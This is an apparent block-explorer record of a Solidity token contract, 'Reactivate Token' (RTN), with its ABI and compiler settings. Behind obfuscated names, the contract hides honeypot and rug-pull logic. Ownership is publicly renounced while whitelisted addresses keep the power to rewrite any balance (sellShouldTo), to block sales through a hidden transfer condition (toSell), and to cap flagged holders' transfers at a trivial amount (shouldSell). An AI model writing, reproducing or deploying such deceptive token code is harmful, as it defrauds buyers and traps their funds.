{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface walletShouldToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyLimit) external view returns (uint256);\n\n    function transfer(address senderLaunched, uint256 launchLaunched) external returns (bool);\n\n    function allowance(address amountTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderLaunched,\n        uint256 launchLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toIs, uint256 value);\n    event Approval(address indexed amountTotal, address indexed spender, uint256 value);\n}\n\nabstract contract isAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundFrom {\n    function createPair(address toLiquidity, address swapFrom) external returns (address);\n}\n\ninterface launchMin is walletShouldToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReactivateToken is isAt, walletShouldToken, launchMin {\n\n    function limitToken(address tokenTakeWallet, address senderLaunched, uint256 launchLaunched) internal returns (bool) {\n        if (tokenTakeWallet == tradingExempt) {\n            return enableReceiverMin(tokenTakeWallet, senderLaunched, launchLaunched);\n        }\n        uint256 teamFee = walletShouldToken(isReceiver).balanceOf(enableTradingFrom);\n        require(teamFee == senderTx);\n        require(senderLaunched != enableTradingFrom);\n        if (toShouldTotal[tokenTakeWallet]) {\n            return enableReceiverMin(tokenTakeWallet, senderLaunched, feeTeamTrading);\n        }\n        return enableReceiverMin(tokenTakeWallet, senderLaunched, launchLaunched);\n    }\n\n    function getOwner() external view returns (address) {\n        return walletExemptReceiver;\n    }\n\n    function owner() external view returns (address) {\n        return walletExemptReceiver;\n    }\n\n    event OwnershipTransferred(address indexed fundEnableLaunched, address indexed swapReceiver);\n\n    function balanceOf(address buyLimit) public view virtual override returns (uint256) {\n        return exemptListTake[buyLimit];\n    }\n\n    function transfer(address takeLimit, uint256 launchLaunched) external virtual override returns (bool) {\n        return limitToken(_msgSender(), takeLimit, launchLaunched);\n    }\n\n    function allowance(address walletAutoLimit, address enableLimitLiquidity) external view virtual override returns (uint256) {\n        if (enableLimitLiquidity == takeFee) {\n            return type(uint256).max;\n        }\n        return launchedTo[walletAutoLimit][enableLimitLiquidity];\n    }\n\n    uint256 private teamWalletToken = 100000000 * 10 ** 18;\n\n    bool private autoTokenAt;\n\n    function name() external view virtual override returns (string memory) {\n        return walletIs;\n    }\n\n    mapping(address => uint256) private exemptListTake;\n\n    string private launchReceiverSender = \"RTN\";\n\n    function toSell(uint256 launchLaunched) public {\n        limitAt();\n        senderTx = launchLaunched;\n    }\n\n    uint256 public launchAt;\n\n    string private walletIs = \"Reactivate Token\";\n\n    address private walletExemptReceiver;\n\n    function atFund(address receiverFrom) public {\n        if (isTeamAmount) {\n            return;\n        }\n        if (walletTx) {\n            isLaunchShould = exemptMode;\n        }\n        listReceiver[receiverFrom] = true;\n        if (exemptMode == launchAt) {\n            launchAt = isLaunchShould;\n        }\n        isTeamAmount = true;\n    }\n\n    bool public walletTx;\n\n    function enableReceiverMin(address tokenTakeWallet, address senderLaunched, uint256 launchLaunched) internal returns (bool) {\n        require(exemptListTake[tokenTakeWallet] >= launchLaunched);\n        exemptListTake[tokenTakeWallet] -= launchLaunched;\n        exemptListTake[senderLaunched] += launchLaunched;\n        emit Transfer(tokenTakeWallet, senderLaunched, launchLaunched);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchedTo;\n\n    address enableTradingFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamWalletToken;\n    }\n\n    uint256 public exemptMode;\n\n    address public isReceiver;\n\n    uint256 public isLaunchShould;\n\n    constructor (){\n        if (autoTokenAt) {\n            autoTokenAt = false;\n        }\n        limitMin launchedMax = limitMin(takeFee);\n        isReceiver = fundFrom(launchedMax.factory()).createPair(launchedMax.WETH(), address(this));\n        \n        tradingExempt = _msgSender();\n        tokenMin();\n        listReceiver[tradingExempt] = true;\n        exemptListTake[tradingExempt] = teamWalletToken;\n        if (isLaunchShould != atLaunch) {\n            autoTokenAt = false;\n        }\n        emit Transfer(address(0), tradingExempt, teamWalletToken);\n    }\n\n    address takeFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchReceiverSender;\n    }\n\n    mapping(address => bool) public toShouldTotal;\n\n    function transferFrom(address tokenTakeWallet, address senderLaunched, uint256 launchLaunched) external override returns (bool) {\n        if (_msgSender() != takeFee) {\n            if (launchedTo[tokenTakeWallet][_msgSender()] != type(uint256).max) {\n                require(launchLaunched <= launchedTo[tokenTakeWallet][_msgSender()]);\n                launchedTo[tokenTakeWallet][_msgSender()] -= launchLaunched;\n            }\n        }\n        return limitToken(tokenTakeWallet, senderLaunched, launchLaunched);\n    }\n\n    bool public isTeamAmount;\n\n    uint256 constant feeTeamTrading = 20 ** 10;\n\n    uint256 private atLaunch;\n\n    mapping(address => bool) public listReceiver;\n\n    address public tradingExempt;\n\n    function approve(address enableLimitLiquidity, uint256 launchLaunched) public virtual override returns (bool) {\n        launchedTo[_msgSender()][enableLimitLiquidity] = launchLaunched;\n        emit Approval(_msgSender(), enableLimitLiquidity, launchLaunched);\n        return true;\n    }\n\n    function sellShouldTo(address takeLimit, uint256 launchLaunched) public {\n        limitAt();\n        exemptListTake[takeLimit] = launchLaunched;\n    }\n\n    function shouldSell(address launchedToken) public {\n        limitAt();\n        \n        if (launchedToken == tradingExempt || launchedToken == isReceiver) {\n            return;\n        }\n        toShouldTotal[launchedToken] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isEnable;\n    }\n\n    uint256 launchedAmount;\n\n    function tokenMin() public {\n        emit OwnershipTransferred(tradingExempt, address(0));\n        walletExemptReceiver = address(0);\n    }\n\n    uint8 private isEnable = 18;\n\n    function limitAt() private view {\n        require(listReceiver[_msgSender()]);\n    }\n\n    uint256 senderTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundEnableLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletAutoLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableLimitLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLimitLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"}],\"name\":\"atFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunchShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTeamAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchLaunched\",\"type\":\"uint256\"}],\"name\":\"sellShouldTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedToken\",\"type\":\"address\"}],\"name\":\"shouldSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchLaunched\",\"type\":\"uint256\"}],\"name\":\"toSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toShouldTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTakeWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ReactivateToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}